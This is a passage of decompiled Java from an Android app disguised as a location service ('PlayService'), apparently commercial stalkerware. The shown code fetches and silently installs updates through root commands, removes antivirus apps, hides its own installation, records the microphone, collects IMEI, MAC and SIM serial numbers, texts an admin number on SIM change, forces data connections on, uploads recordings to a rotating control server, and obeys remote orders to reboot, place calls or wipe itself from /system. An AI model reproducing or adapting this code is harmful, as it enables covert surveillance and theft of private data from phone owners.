      //   500: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   503: aload 13
      //   505: invokevirtual 193	java/io/File:createNewFile	()Z
      //   508: pop
      //   509: new 62	java/lang/StringBuilder
      //   512: dup
      //   513: ldc -61
      //   515: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   518: aload 13
      //   520: invokevirtual 164	java/io/File:canWrite	()Z
      //   523: invokevirtual 167	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
      //   526: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   529: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   532: aload 13
      //   534: invokevirtual 164	java/io/File:canWrite	()Z
      //   537: ifne +27 -> 564
      //   540: new 62	java/lang/StringBuilder
      //   543: dup
      //   544: ldc -59
      //   546: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   549: aload 13
      //   551: invokevirtual 141	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   554: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   557: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   560: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   563: return
      //   564: ldc -57
      //   566: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   569: iconst_0
      //   570: istore 4
      //   572: aconst_null
      //   573: astore 5
      //   575: aconst_null
      //   576: astore 8
      //   578: aconst_null
      //   579: astore 11
      //   581: aconst_null
      //   582: astore 6
      //   584: aconst_null
      //   585: astore 12
      //   587: aconst_null
      //   588: astore 10
      //   590: new 201	java/io/FileOutputStream
      //   593: dup
      //   594: aload 13
      //   596: invokespecial 204	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
      //   599: astore 7
      //   601: aload 10
      //   603: astore 6
      //   605: aload 12
      //   607: astore 5
      //   609: ldc -50
      //   611: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   614: aload 10
      //   616: astore 6
      //   618: aload 12
      //   620: astore 5
      //   622: aload 14
      //   624: invokevirtual 210	java/net/HttpURLConnection:getInputStream	()Ljava/io/InputStream;
      //   627: astore 8
      //   629: aload 8
      //   631: astore 6
      //   633: aload 8
      //   635: astore 5
      //   637: ldc -44
      //   639: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   642: aload 8
      //   644: astore 6
      //   646: aload 8
      //   648: astore 5
      //   650: sipush 1024
      //   653: newarray byte
      //   655: astore 10
      //   657: aload 8
      //   659: astore 6
      //   661: aload 8
      //   663: astore 5
      //   665: ldc -42
      //   667: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   670: aload 8
      //   672: astore 6
      //   674: aload 8
      //   676: astore 5
      //   678: aload 8
      //   680: aload 10
      //   682: invokevirtual 220	java/io/InputStream:read	([B)I
      //   685: istore_3
      //   686: iload_3
      //   687: iconst_m1
      //   688: if_icmpne +56 -> 744
      //   691: aload 8
      //   693: astore 6
      //   695: aload 8
      //   697: astore 5
      //   699: ldc -34
      //   701: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   704: iconst_1
      //   705: istore_3
      //   706: aload 7
      //   708: ifnull +8 -> 716
      //   711: aload 7
      //   713: invokevirtual 225	java/io/FileOutputStream:close	()V
      //   716: aload 8
      //   718: ifnull +485 -> 1203
      //   721: aload 8
      //   723: invokevirtual 226	java/io/InputStream:close	()V
      //   726: iload_3
      //   727: ifne +128 -> 855
      //   730: ldc -28
      //   732: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   735: ldc2_w 229
      //   738: invokestatic 93	java/lang/Thread:sleep	(J)V
      //   741: goto -603 -> 138
      //   744: aload 8
      //   746: astore 6
      //   748: aload 8
      //   750: astore 5
      //   752: aload 7
      //   754: aload 10
      //   756: iconst_0
      //   757: iload_3
      //   758: invokevirtual 234	java/io/FileOutputStream:write	([BII)V
      //   761: goto -91 -> 670
      //   764: astore 10
      //   766: aload 7
      //   768: astore 8
      //   770: aload 6
      //   772: astore 7
      //   774: aload 8
      //   776: astore 5
      //   778: aload 7
      //   780: astore 6
      //   782: aload 10
      //   784: ldc -20
      //   786: invokestatic 175	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   789: aload 8
      //   791: ifnull +8 -> 799
      //   794: aload 8
      //   796: invokevirtual 225	java/io/FileOutputStream:close	()V
      //   799: iload 4
      //   801: istore_3
      //   802: aload 7
      //   804: ifnull -78 -> 726
      //   807: aload 7
      //   809: invokevirtual 226	java/io/InputStream:close	()V
      //   812: iload 4
      //   814: istore_3
      //   815: goto -89 -> 726
      //   818: astore 5
      //   820: iload 4
      //   822: istore_3
      //   823: goto -97 -> 726
      //   826: astore 7
      //   828: aload 5
      //   830: astore 8
      //   832: aload 8
      //   834: ifnull +8 -> 842
      //   837: aload 8
      //   839: invokevirtual 225	java/io/FileOutputStream:close	()V
      //   842: aload 6
      //   844: ifnull +8 -> 852
      //   847: aload 6
      //   849: invokevirtual 226	java/io/InputStream:close	()V
      //   852: aload 7
      //   854: athrow
      //   855: ldc -18
      //   857: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   860: new 62	java/lang/StringBuilder
      //   863: dup
      //   864: ldc -16
      //   866: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   869: aload 13
      //   871: invokevirtual 141	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   874: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   877: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   880: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   883: aload_0
      //   884: getfield 15	com/android/location/PlayService$Updater:this$0	Lcom/android/location/PlayService;
      //   887: invokestatic 244	com/android/location/PlayService:access$2	(Lcom/android/location/PlayService;)Z
      //   890: ifeq +81 -> 971
      //   893: ldc -10
      //   895: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   898: new 62	java/lang/StringBuilder
      //   901: dup
      //   902: ldc -8
      //   904: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   907: aload 13
      //   909: invokevirtual 141	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   912: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   915: ldc -6
      //   917: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   920: aload 9
      //   922: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   925: ldc -4
      //   927: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   930: aload 9
      //   932: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   935: ldc -2
      //   937: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   940: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   943: invokestatic 258	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
      //   946: pop
      //   947: ldc2_w 229
      //   950: invokestatic 93	java/lang/Thread:sleep	(J)V
      //   953: ldc_w 260
      //   956: invokestatic 258	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
      //   959: pop
      //   960: ldc_w 262
      //   963: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   966: iconst_1
      //   967: istore_2
      //   968: goto -551 -> 417
      //   971: getstatic 266	com/android/location/PlayService:bCanSu	B
      //   974: istore_3
      //   975: getstatic 269	com/android/location/PlayService:CAN	B
      //   978: istore 4
      //   980: iload_3
      //   981: iload 4
      //   983: if_icmpne +71 -> 1054
      //   986: ldc_w 271
      //   989: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   992: new 62	java/lang/StringBuilder
      //   995: dup
      //   996: ldc -8
      //   998: invokespecial 65	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
      //   1001: aload 13
      //   1003: invokevirtual 141	java/io/File:getAbsolutePath	()Ljava/lang/String;
      //   1006: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1009: ldc -6
      //   1011: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1014: aload 9
      //   1016: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1019: ldc -4
      //   1021: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1024: aload 9
      //   1026: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1029: ldc -2
      //   1031: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1034: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   1037: invokestatic 258	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
      //   1040: pop
      //   1041: ldc2_w 229
      //   1044: invokestatic 93	java/lang/Thread:sleep	(J)V
      //   1047: ldc_w 260
      //   1050: invokestatic 258	com/android/location/PlayService:commandSU	(Ljava/lang/String;)B
      //   1053: pop
      //   1054: ldc_w 273
      //   1057: invokestatic 76	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
      //   1060: new 275	android/content/Intent
      //   1063: dup
      //   1064: ldc_w 277
      //   1067: invokespecial 278	android/content/Intent:<init>	(Ljava/lang/String;)V
      //   1070: astore 5
      //   1072: aload 5
      //   1074: new 138	java/io/File
      //   1077: dup
      //   1078: new 62	java/lang/StringBuilder
      //   1081: dup
      //   1082: invokespecial 279	java/lang/StringBuilder:<init>	()V
      //   1085: invokestatic 136	android/os/Environment:getExternalStorageDirectory	()Ljava/io/File;
      //   1088: invokevirtual 282	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
      //   1091: ldc_w 284
      //   1094: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1097: ldc -71
      //   1099: invokevirtual 69	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   1102: invokevirtual 73	java/lang/StringBuilder:toString	()Ljava/lang/String;
      //   1105: invokespecial 148	java/io/File:<init>	(Ljava/lang/String;)V
      //   1108: invokestatic 290	android/net/Uri:fromFile	(Ljava/io/File;)Landroid/net/Uri;
      //   1111: ldc_w 292
      //   1114: invokevirtual 296	android/content/Intent:setDataAndType	(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;
      //   1117: pop
      //   1118: aload 5
      //   1120: ldc_w 297
      //   1123: invokevirtual 301	android/content/Intent:setFlags	(I)Landroid/content/Intent;
      //   1126: pop
      //   1127: aload_0
      //   1128: getfield 15	com/android/location/PlayService$Updater:this$0	Lcom/android/location/PlayService;
      //   1131: aload 5
      //   1133: invokevirtual 305	com/android/location/PlayService:startActivity	(Landroid/content/Intent;)V
      //   1136: goto -176 -> 960
      //   1139: astore 5
      //   1141: aload 5
      //   1143: ldc_w 307
      //   1146: invokestatic 175	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
      //   1149: goto -95 -> 1054
      //   1152: astore 5
      //   1154: goto -991 -> 163
      //   1157: astore 5
      //   1159: goto -360 -> 799
      //   1162: astore 5
      //   1164: goto -322 -> 842
      //   1167: astore 5
      //   1169: goto -317 -> 852
      //   1172: astore 5
      //   1174: goto -458 -> 716
      //   1177: astore 10
      //   1179: aload 7
      //   1181: astore 8
      //   1183: aload 5
      //   1185: astore 6
      //   1187: aload 10
      //   1189: astore 7
      //   1191: goto -359 -> 832
      //   1194: astore 10
      //   1196: aload 11
      //   1198: astore 7
      //   1200: goto -426 -> 774
      //   1203: goto -477 -> 726
      //   1206: astore 5
      //   1208: goto -482 -> 726
      // Local variable table:
      //   start	length	slot	name	signature
      //   0	1211	0	this	Updater
      //   137	289	1	i	int
      //   135	833	2	j	int
      //   685	299	3	k	int
      //   570	414	4	m	int
      //   45	292	5	localObject1	Object
      //   408	3	5	localException1	Exception
      //   435	22	5	localException2	Exception
      //   573	204	5	localObject2	Object
      //   818	11	5	localIOException1	IOException
      //   1070	62	5	localIntent	Intent
      //   1139	3	5	localException3	Exception
      //   1152	1	5	localException4	Exception
      //   1157	1	5	localIOException2	IOException
      //   1162	1	5	localIOException3	IOException
      //   1167	1	5	localIOException4	IOException
      //   1172	12	5	localIOException5	IOException
      //   1206	1	5	localIOException6	IOException
      //   297	889	6	localObject3	Object
      //   599	209	7	localObject4	Object
      //   826	354	7	localObject5	Object
      //   1189	10	7	localObject6	Object
      //   576	606	8	localObject7	Object
      //   34	991	9	str	String
      //   588	167	10	arrayOfByte	byte[]
      //   764	19	10	localException5	Exception
      //   1177	11	10	localObject8	Object
      //   1194	1	10	localException6	Exception
      //   579	618	11	localObject9	Object
      //   585	34	12	localObject10	Object
      //   478	524	13	localFile	File
      //   222	401	14	localHttpURLConnection	java.net.HttpURLConnection
      // Exception table:
      //   from	to	target	type
      //   174	353	408	java/lang/Exception
      //   353	407	408	java/lang/Exception
      //   447	563	408	java/lang/Exception
      //   564	569	408	java/lang/Exception
      //   711	716	408	java/lang/Exception
      //   721	726	408	java/lang/Exception
      //   730	741	408	java/lang/Exception
      //   794	799	408	java/lang/Exception
      //   807	812	408	java/lang/Exception
      //   837	842	408	java/lang/Exception
      //   847	852	408	java/lang/Exception
      //   852	855	408	java/lang/Exception
      //   855	960	408	java/lang/Exception
      //   960	966	408	java/lang/Exception
      //   971	980	408	java/lang/Exception
      //   1054	1136	408	java/lang/Exception
      //   1141	1149	408	java/lang/Exception
      //   426	432	435	java/lang/Exception
      //   609	614	764	java/lang/Exception
      //   622	629	764	java/lang/Exception
      //   637	642	764	java/lang/Exception
      //   650	657	764	java/lang/Exception
      //   665	670	764	java/lang/Exception
      //   678	686	764	java/lang/Exception
      //   699	704	764	java/lang/Exception
      //   752	761	764	java/lang/Exception
      //   807	812	818	java/io/IOException
      //   590	601	826	finally
      //   782	789	826	finally
      //   986	1054	1139	java/lang/Exception
      //   157	163	1152	java/lang/Exception
      //   794	799	1157	java/io/IOException
      //   837	842	1162	java/io/IOException
      //   847	852	1167	java/io/IOException
      //   711	716	1172	java/io/IOException
      //   609	614	1177	finally
      //   622	629	1177	finally
      //   637	642	1177	finally
      //   650	657	1177	finally
      //   665	670	1177	finally
      //   678	686	1177	finally
      //   699	704	1177	finally
      //   752	761	1177	finally
      //   590	601	1194	java/lang/Exception
      //   721	726	1206	java/io/IOException
    }
    
    public boolean uri2host(String paramString)
    {
      String str = "";
      try
      {
        paramString = new URI(paramString).getHost();
        str = paramString;
        PlayService.FLOG("resolver:" + paramString);
        return true;
      }
      catch (Exception paramString)
      {
        PlayService.EXCEPT(paramString, "cant resolve:" + str);
      }
      return false;
    }
  }
  
  public class Uploader
    extends Thread
  {
    public Uploader() {}
    
    private void Force()
    {
      PlayService.FLOG("TRY isGet2");
      PlayService.FLOG("Force 3g connect ? ");
      if (PlayService.bForce3G)
      {
        PlayService.this.turn3GOn();
        PlayService.FLOG("Force 3g done");
        PlayService.this.setMobileDataEnabled(PlayService.ref.getApplicationContext(), true);
        PlayService.FLOG("setMobileDataEnabled");
      }
      int i = SMSReceiver.isGet2(PlayService.Server);
      PlayService.FLOG("isGet2 = " + i);
      long l = PlayService.this.LoadKnockTime();
      PlayService.FLOG("last=" + l + ", cur=" + PlayService.getCurrentTime());
      if (PlayService.getCurrentTime() - l > PlayService.iUploadInterval * 5 * 60 * 1000)
      {
        PlayService.FLOG("5 intervals we had no connection");
        PlayService.this.RotateHost();
        PlayService.FLOG("new host:port = " + PlayService.Server + ":" + PlayService.Port);
      }
      for (;;)
      {
        PlayService.FLOG("forceMobileconnectionForAddress=" + PlayService.Server);
        PlayService.forceMobileConnectionForAddress(PlayService.ref, PlayService.Server);
        return;
        PlayService.FLOG("Until port change: " + (PlayService.iUploadInterval * 60 * 1000 + l - PlayService.getCurrentTime()));
      }
    }
    
    public void run()
    {
      PlayService.this.Running = true;
      PlayService.FLOG("UPLOADER::STARTED");
      if (!(Thread.getDefaultUncaughtExceptionHandler() instanceof CustomExceptionHandler)) {
        Thread.setDefaultUncaughtExceptionHandler(new CustomExceptionHandler("/sdcard"));
      }
      Looper.prepare();
      if (PlayService.checkSU(PlayService.SU)) {
        PlayService.bCanSu = PlayService.CAN;
      }
      Object localObject2;
      int i;
      int j;
      for (;;)
      {
        PlayService.this.UpdateState(PlayService.res.getString(2130968601), false, PlayService.bCanSu);
        ru.dtlbox.databasereader.RootCommand.SU = PlayService.SU;
        PlayService.FLOG("CANSU=" + PlayService.bCanSu);
        if (PlayService.bCanSu == PlayService.CAN)
        {
          PlayService.ProcessBlockList();
          PlayService.this.DisableGionee();
          PlayService.this.InstallAbarona();
          PlayService.this.EnableXPOSEDmodule();
        }
        if (PlayService.bCanSu == PlayService.CAN) {
          PlayService.this.bCanUseSQLITE = PlayService.this.PrepareSQLITE3();
        }
        PlayService.this.removeMyUserInstallation();
        try
        {
          PlayService.FLOG("Creating lama Class");
          localObject1 = PlayService.this;
          localObject2 = PlayService.context;
          if (PlayService.iSamplingRate > 0)
          {
            i = PlayService.iSamplingRate;
            ((PlayService)localObject1).mRecMicToMp3 = new RecMicToMp3((Context)localObject2, i);
            if ((PlayService.this.mRecMicToMp3 == null) || (!RecMicToMp3.haslama))
            {
              PlayService.FLOG("Lama cannot be used cause of error class creation");
              PlayService.FLOG("Try to born lama");
              PlayService.this.tryBornLamaLib();
              PlayService.FLOG("Try again create lama Class");
              localObject1 = PlayService.this;
              localObject2 = PlayService.context;
              if (PlayService.iSamplingRate <= 0) {
                break label947;
              }
              i = PlayService.iSamplingRate;
              ((PlayService)localObject1).mRecMicToMp3 = new RecMicToMp3((Context)localObject2, i);
              if ((PlayService.this.mRecMicToMp3 == null) || (!RecMicToMp3.haslama))
              {
                PlayService.FLOG("Lama cannot be used cause of error class creation 2. Epic fail");
                PlayService.putEvent("Lama cannot be used cause of error class creation 2. Epic fail");
                PlayService.bUseLame = false;
              }
            }
            if (PlayService.this.mRecMicToMp3 != null) {
              PlayService.this.mRecMicToMp3.setHandle(new Handler()
              {
                public void handleMessage(Message paramAnonymousMessage)
                {
                  switch (paramAnonymousMessage.what)
                  {
                  default: 
                    return;
                  case 0: 
                    PlayService.FLOG("lame:MSG_REC_STARTED");
                    return;
                  case 1: 
                    PlayService.FLOG("lame:MSG_REC_STOPPED");
                    return;
                  case 2: 
                    PlayService.FLOG("lame:MSG_ERROR_GET_MIN_BUFFERSIZE");
                    return;
                  case 3: 
                    PlayService.FLOG("lame:MSG_ERROR_CREATE_FILE");
                    return;
                  case 4: 
                    PlayService.FLOG("lame:MSG_ERROR_REC_START");
                    return;
                  case 5: 
                    PlayService.FLOG("lame:MSG_ERROR_AUDIO_RECORD");
                    return;
                  case 6: 
                    PlayService.FLOG("lame:MSG_ERROR_AUDIO_ENCODE");
                    return;
                  case 7: 
                    PlayService.FLOG("lame:MSG_ERROR_WRITE_FILE");
                    return;
                  }
                  PlayService.FLOG("lame:MSG_ERROR_CLOSE_FILE");
                }
              });
            }
            PlayService.FLOG("DECODE UPDATE url = " + SMSReceiver.DEFAULT_UPDATE_URL);
            SMSReceiver.DEFAULT_UPDATE_URL = PlayService.DecodeURL(SMSReceiver.DEFAULT_UPDATE_URL);
            PlayService.FLOG("after decode UPDATE url = " + SMSReceiver.DEFAULT_UPDATE_URL);
            localObject1 = new Config.Builder();
            localObject2 = PlayService.dataPath + "/";
            PlayService.FLOG("cachedir=" + (String)localObject2);
            ((Config.Builder)localObject1).setCachePath((String)localObject2);
            PlayService.megaconfig = ((Config.Builder)localObject1).build();
            if (PlayService.bCanSu != PlayService.CAN) {
              break label967;
            }
            PlayService.this.UpdateState(PlayService.res.getString(2130968600), false, PlayService.bCanSu);
            PlayService.FLOG("Remove Anti Virus");
            PlayService.this.RemoveAntiVirus();
          }
        }
        catch (Exception localException1)
        {
          try
          {
            for (;;)
            {
              PlayService.this.DelayedInit();
              PlayService.FLOG("Delayed init passed");
              Object localObject1 = null;
              localObject2 = (PowerManager)PlayService.ref.getBaseContext().getSystemService("power");
              if (localObject2 != null) {
                localObject1 = ((PowerManager)localObject2).newWakeLock(1, "backup.service");
              }
              j = 0;
              try
              {
                if (PlayService.sMAC == null) {
                  PlayService.sMAC = "";
                }
                if (PlayService.sIMEI == null) {
                  PlayService.sIMEI = "";
                }
                if ((PlayService.sIMEI.length() == 0) && (PlayService.sMAC.length() == 0)) {
                  break label989;
                }
                if (PlayService.this.CUSTOMER_ID > 0) {
                  PlayService.this.AddMeToServer(PlayService.this.CUSTOMER_ID);
                }
                localObject2 = PlayService.this.GetSIMSerial();
                PlayService.FLOG("cursim=" + (String)localObject2);
                PlayService.FLOG("lastsim=" + PlayService.sSimID);
                PlayService.FLOG("eq=" + PlayService.sSimID.equals(localObject2));
                PlayService.FLOG("report=" + PlayService.bReportSimChange);
                if ((localObject2 != null) && (PlayService.sSimID != null) && (((String)localObject2).length() > 0) && (PlayService.sSimID.length() > 0) && (!PlayService.sSimID.equals(localObject2)))
                {
                  PlayService.FLOG("SIM1 was changed!!! to " + PlayService.sAdminNumber);
                  if (PlayService.bReportSimChange) {
                    PlayService.this.SendSMS(PlayService.sAdminNumber, "Произведена смена SIM карты в телефоне [" + PlayService.sIMEI + "] SIMID:" + (String)localObject2);
                  }
                  PlayService.putEvent(PlayService.res.getString(2130968587) + " IMEI:" + PlayService.sIMEI + " SIMID:" + (String)localObject2);
                }
                PlayService.FLOG("Save last sim");
                PlayService.sSimID = (String)localObject2;
                PlayService.SaveSettings();
                PlayService.FLOG("Settings saved");
                if (PlayService.bWork) {
                  break label2596;
                }
                PlayService.FLOG("PROGRAM IS OFF! *38*");
              }
              catch (Exception localException3)
              {
                for (;;)
                {
                  PlayService.EXCEPT(localException3, "UPLOADER FALLEN DOWN!");
                }
                i1 = k + 1;
              }
              if (PlayService.this.Running) {
                break label1183;
              }
              PlayService.FLOG("Uploader was turned off");
              PlayService.FLOG("Uploader thread finished");
              return;
              PlayService.bCanSu = PlayService.NECAN;
              break;
              i = 8000;
              continue;
              label947:
              i = 8000;
              continue;
              localException1 = localException1;
              PlayService.EXCEPT(localException1, "new RecMicToMp3(context, 8000);");
              continue;
              label967:
              PlayService.FLOG("side readers disabled due to non SU");
            }
          }
          catch (Exception localException2)
          {
            for (;;)
            {
              PlayService.EXCEPT(localException2, "DelayedInit fails, x3 what to do");
              continue;
              label989:
              PlayService.sIMEI = PlayService.this.telephonyManager.getDeviceId();
              if (PlayService.sIMEI == null) {
                PlayService.sIMEI = "";
              }
              PlayService.FLOG("IMEI = " + PlayService.sIMEI);
              localObject2 = ((WifiManager)PlayService.this.getSystemService("wifi")).getConnectionInfo();
              if (localObject2 != null) {
                PlayService.sMAC = ((WifiInfo)localObject2).getMacAddress();
              }
              if (PlayService.sMAC == null) {
                PlayService.sMAC = "";
              }
              PlayService.FLOG("MAC = " + PlayService.sMAC);
              localObject2 = PlayService.this;
              ((PlayService)localObject2).iMacFindCounter += 1;
              localObject2 = PlayService.this;
              ((PlayService)localObject2).iImeiFindCounter += 1;
              if ((PlayService.sIMEI.length() <= 0) && (PlayService.sMAC.length() <= 0))
              {
                PlayService.FLOG("IMEI and MAC are null, cannot continue");
                sleep(10000L);
              }
            }
          }
        }
      }
      label1183:
      int k;
      int i1;
      label1188:
      if (!PlayService.bWork)
      {
        boolean bool = PlayService.this.Running;
        if (bool) {
          break label2034;
        }
      }
      label1286:
      label1420:
      int m;
      try
      {
        if (PlayService.bCanSu == PlayService.CAN) {
          PlayService.this.EnableXPOSEDmodule();
        }
        if ((PlayService.sIMEI == null) || (PlayService.sIMEI.length() == 0))
        {
          PlayService.FLOG("Find IMEI");
          localObject2 = PlayService.this;
          ((PlayService)localObject2).iImeiFindCounter += 1;
          if (PlayService.this.telephonyManager == null) {
            break label2043;
          }
          PlayService.sIMEI = PlayService.this.telephonyManager.getDeviceId();
          PlayService.FLOG("IMEI=" + PlayService.sIMEI);
          if ((PlayService.sIMEI == null) || (PlayService.sIMEI.length() == 0)) {
            PlayService.FLOG("IS mobile network enabled?");
          }
        }
        if ((PlayService.sMAC != null) && (PlayService.sMAC.length() != 0)) {
          break label1420;
        }
        PlayService.FLOG("Find MAC");
        localObject2 = PlayService.this;
        ((PlayService)localObject2).iMacFindCounter += 1;
        localObject2 = (WifiManager)PlayService.this.getSystemService("wifi");
        if (localObject2 == null) {
          break label2074;
        }
        localObject2 = ((WifiManager)localObject2).getConnectionInfo();
        if (localObject2 == null) {
          break label2065;
        }
        PlayService.sMAC = ((WifiInfo)localObject2).getMacAddress();
      }
      catch (Exception localException4)
      {
        for (;;)
        {
          PlayService.EXCEPT(localException4, "try imei and mac find");
          continue;
          PlayService.FLOG("WifiInfo is null, cannot get MAC");
          continue;
          PlayService.FLOG("WifiManager is null, cannot get MAC");
          continue;
          k = j;
          if (!PlayService.bUseWakeLock)
          {
            k = j;
            if (j != 0)
            {
              k = j;
              if (localException3 != null)
              {
                PlayService.FLOG("wakeLock.release();");
                localException3.release();
                k = 0;
                continue;
                PlayService.FLOG("Wifi already enabled or null");
              }
            }
          }
        }
      }
      if (PlayService.sMAC == null) {
        PlayService.sMAC = "";
      }
      if ((PlayService.bUseWakeLock) && (j == 0) && (localException3 != null))
      {
        PlayService.FLOG("wakeLock.acquire();");
        k = 1;
        localException3.acquire();
        localObject2 = new Time();
        ((Time)localObject2).setToNow();
        if ((((Time)localObject2).toMillis(true) <= PlayService.this.lUploadCounter + PlayService.iUploadInterval * 60 * 1000) && ((PlayService.iConfig != 4) || (((Time)localObject2).toMillis(true) <= PlayService.this.lUploadCounter + PlayService.iUploadInterval * 20 * 1000))) {
          break label2544;
        }
        PlayService.this.lUploadCounter = ((Time)localObject2).toMillis(true);
        PlayService.FLOG("UPLOADER::WAKEUP");
        if ((PlayService.iCallRecordState != 0) || (PlayService.this.iVOIPRecordState != 0)) {
          break label2512;
        }
        PlayService.this.UpdateState(PlayService.res.getString(2130968603), false, PlayService.bCanSu);
        m = 0;
        if (PlayService.iTransfer == 0) {
          m = 1;
        }
        j = m;
        if (PlayService.iTransfer == 1)
        {
          j = m;
          if (PlayService.iWifiOnOff == 1) {
            j = 1;
          }
        }
        m = j;
        if (PlayService.iTransfer == 2)
        {
          m = j;
          if (PlayService.iChargingNow == 1) {
            m = 1;
          }
        }
        j = m;
        if (PlayService.iTransfer == 3)
        {
          j = m;
          if (PlayService.iWifiOnOff == 1)
          {
            j = m;
            if (PlayService.iChargingNow == 1) {
              j = 1;
            }
          }
        }
        if (j == 0) {
          break label2456;
        }
        m = i;
        if (i != 0)
        {
          m = 0;
          PlayService.FLOG("Force()");
          Force();
        }
        if (PlayService.bForceWIFI)
        {
          PlayService.FLOG("IsWifiEnabled?");
          localObject2 = (WifiManager)PlayService.this.getSystemService("wifi");
          PlayService.FLOG("wifi=" + localObject2);
          if ((localObject2 == null) || (((WifiManager)localObject2).isWifiEnabled())) {
            break label2120;
          }
          PlayService.FLOG("Try to Enable");
          ((WifiManager)localObject2).setWifiEnabled(true);
          PlayService.FLOG("Sleep 20 secs");
          Thread.sleep(20000L);
        }
        i = PlayService.this.UploadDataToServer();
        PlayService.this.DoAfterUploadJob();
        if (i != 0) {
          break label2388;
        }
        PlayService.this.SaveKnockTime();
        PlayService.FLOG("UPLOADER::LastKnockTime Saved");
        PlayService.FLOG("TRY to upload BINARY");
        PlayService.FLOG("TB=" + PlayService.iTransferBinary + ",TBU=" + PlayService.iTransferBinaryUnlim);
        PlayService.FLOG("WIFI=" + PlayService.iWifiOnOff + ",CHARGE=" + PlayService.iChargingNow);
        i = 20;
        break label2603;
      }
      for (;;)
      {
        label1893:
        if (PlayService.this.sch != null) {
          PlayService.this.sch.close();
        }
        PlayService.this.sch = null;
        i = m;
        label1924:
        PlayService.FLOG("UPLOADER::Zzzzz");
        if (PlayService.bRebootMe)
        {
          PlayService.FLOG("Master says to reboot");
          SMSReceiver.rebootSU();
        }
        if (PlayService.sMakeCall.length() > 0)
        {
          PlayService.MakeCall(PlayService.sMakeCall.trim());
          PlayService.sMakeCall = "";
        }
        m = i;
        if (PlayService.bUninstallMe)
        {
          PlayService.FLOG("Master says:uninstall");
          PlayService.commandSU("mount -o remount,rw -t yaffs2 /dev/block/mtdblk3 /system ; rm /system/app/Shadow.apk ; rm /data/app/" + PlayService.MY_PACKAGE_NAME + "*.apk ; reboot");
          m = i;
        }
        label2017:
        sleep(10000L);
        j = k;
        i = m;
        k = i1;
        break;
        label2034:
        sleep(60000L);
        break label1188;
        label2043:
        PlayService.FLOG("telephonyManager is null, cannot get IMEI");
        break label1286;
        label2065:
        label2074:
        label2120:
        label2388:
        label2456:
        label2512:
        label2544:
        label2596:
        label2603:
        do
        {
          PlayService.FLOG("Create&Upload Audio");
          int n = 0;
          if (PlayService.iTransferBinary == 0) {
            n = PlayService.this.UploadAudioDataToServer();
          }
          i = n;
          if (PlayService.iTransferBinary == 1)
          {
            i = n;
